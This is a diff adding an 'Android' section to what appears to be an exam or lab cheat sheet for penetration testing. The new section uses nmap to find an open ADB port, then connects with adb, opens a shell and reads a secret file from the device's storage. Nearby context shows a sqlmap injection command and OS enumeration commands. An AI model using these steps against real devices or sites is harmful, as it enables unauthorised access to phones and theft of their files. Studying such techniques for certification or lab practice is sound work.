@@ -82,6 +82,13 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
 ```
+# Android
+```
+1- nmap ip -sV -p 5555    (Scan for adb port)
+2- adb connect IP:5555    (Connect adb with parrot)
+3- adb shell              (Access mobile device on parrot)
+4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
+```
 # Wireshark
 ```
 tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
